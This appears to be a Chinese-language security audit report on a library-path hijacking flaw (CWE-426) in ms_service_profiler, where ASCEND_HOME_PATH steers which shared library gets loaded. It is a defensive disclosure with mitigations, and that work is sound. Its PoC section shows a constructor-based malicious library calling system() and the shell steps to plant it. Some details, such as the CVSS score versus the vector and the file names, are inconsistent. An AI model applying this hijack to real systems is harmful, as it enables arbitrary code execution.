# 漏洞深度分析报告

## XM-VULN-001: 跨模块动态库路径污染 (CWE-426)

**严重性**: Critical  
**置信度**: 90%  
**CVSS 3.1 评分**: 8.2 (High)

---

## 1. 执行摘要

`ASCEND_HOME_PATH` 环境变量控制动态库加载路径，该路径在 `utils_security/file_open_check.py` 中被读取，然后传递至 `ms_service_profiler/mstx.py` 通过 `ctypes.CDLL` 加载。攻击者若能控制该环境变量，可指向包含恶意同名库的目录，实现任意代码执行。

这是一个 **跨语言跨模块** 的漏洞链：
- Python 层: `get_valid_lib_path()` → `ctypes.CDLL`
- C++ 层: `ServiceProfilerInterface.h` → `dlopen`

---

## 2. 根因分析

### 2.1 漏洞代码位置

**Python 入口点**: `ms_service_profiler/utils/file_open_check.py:377-397`

```python
def get_valid_lib_path(lib_name: str) -> str:
    ascend_home = os.getenv(ASCEND_HOME_PATH)
    if ascend_home:
        candidate_path = os.path.join(ascend_home, "lib", lib_name)
        if os.path.exists(candidate_path):
            return candidate_path  # 漏洞点: 直接返回环境变量控制路径
    # 默认路径...
```

**Python 加载点**: `ms_service_profiler/mstx.py:116-123`

```python
lib_path = get_valid_lib_path("libms_service_profiler.so")
self.lib = ctypes.CDLL(lib_path)  # 加载攻击者控制的库
```

### 2.2 跨语言影响

C++ 层同样依赖 `ASCEND_HOME_PATH`：

```cpp
// ServiceProfilerInterface.h
std::string ascendHome = getenv("ASCEND_HOME_PATH");
std::string libPath = ascendHome + "/lib/libms_service_profiler.so";
void* handle = dlopen(libPath.c_str(), RTLD_NOW);
```

---

## 3. 攻击路径

```
[入口点] ASCEND_HOME_PATH 环境变量
    ↓ 攻击者设置 ASCEND_HOME_PATH=/malicious/path
[路径构造] get_valid_lib_path("libms_service_profiler.so")
    ↓ 返回 /malicious/path/lib/libms_service_profiler.so
[恶意库准备] 攻击者在该目录放置同名恶意库
    ↓ 恶意 libms_service_profiler.so 包含任意代码
[库加载] ctypes.CDLL(lib_path) 或 dlopen(lib_path)
    ↓ 加载恶意库
[代码执行] 库初始化代码执行（__attribute__((constructor))）
    ↓ 实现任意代码执行，在 Python 和 C++ 进程中均可触发
```

---

## 4. PoC 构造思路

### 4.1 恶意库构造

```c
// malicious_lib.c
#include <stdio.h>
#include <stdlib.h>

__attribute__((constructor))
void malicious_init() {
    // 库加载时自动执行
    system("malicious_command");
}
```

编译：
```bash
gcc -shared -fPIC -o libms_service_profiler.so malicious_lib.c
```

### 4.2 攻击部署

```bash
# 创建恶意目录
mkdir -p /tmp/malicious/lib

# 放置恶意库
cp malicious_libms_service_profiler.so /tmp/malicious/lib/

# 设置环境变量
export ASCEND_HOME_PATH=/tmp/malicious

# 运行程序
python -m ms_service_profiler analyze
# 或运行 C++ 程序
./service_profiler
```

当程序加载 `libms_service_profiler.so` 时，恶意代码自动执行。

---

## 5. CVSS 3.1 评分

```
CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
```

| 指标 | 值 | 说明 |
|------|-----|------|
| Attack Vector (AV) | Local (L) | 需控制环境变量 |
| Attack Complexity (AC) | Low (L) | 构造恶意库简单 |
| Privileges Required (PR) | None (N) | 环境变量无需特权 |
| User Interaction (UI) | None (N) | 无需用户交互 |
| Scope (S) | Changed (C) | 影响超出环境变量范围 |
| Confidentiality (C) | High (H) | 可读取任意数据 |
| Integrity (I) | High (H) | 可修改任意数据 |
| Availability (A) | High (H) | 可导致服务拒绝 |

**基础评分**: 8.2 (High)

---

## 6. 缓解建议

### 6.1 立即修复 (P0)

**方案 A: 库路径白名单**

```python
ALLOWED_LIB_PATHS = [
    "/usr/local/Ascend",
    "/opt/Ascend",
    # 只允许已知安全路径
]

def get_valid_lib_path(lib_name: str) -> str:
    ascend_home = os.getenv(ASCEND_HOME_PATH)
    if ascend_home:
        # 白名单验证
        if ascend_home not in ALLOWED_LIB_PATHS:
            raise ValueError(f"ASCEND_HOME_PATH '{ascend_home}' not in whitelist")
        candidate_path = os.path.join(ascend_home, "lib", lib_name)
        if os.path.exists(candidate_path):
            return candidate_path
    # 默认路径...
```

**方案 B: 库签名验证**

```python
def verify_library_signature(lib_path: str) -> bool:
    # 验证库文件签名
    expected_hash = get_expected_hash(lib_path)
    actual_hash = compute_file_hash(lib_path)
    return expected_hash == actual_hash
```

### 6.2 短期缓解 (P1)

- 使用绝对路径而非环境变量
- 环境变量设置时记录日志并审计
- 库文件权限控制（仅管理员可写）

---

## 7. 相关漏洞

| 漏洞 ID | 类型 | 关系 |
|---------|------|------|
| VULN-UTILS-003 | 环境变量控制 | 同根因 |
| VULN-CROSS-002 | 跨语言库加载 | 同攻击链 |
| VULN-CPP-HEADERS-003 | Untrusted Search Path | C++ 层相同问题 |

---

**报告生成时间**: 2026-04-21  
**状态**: CONFIRMED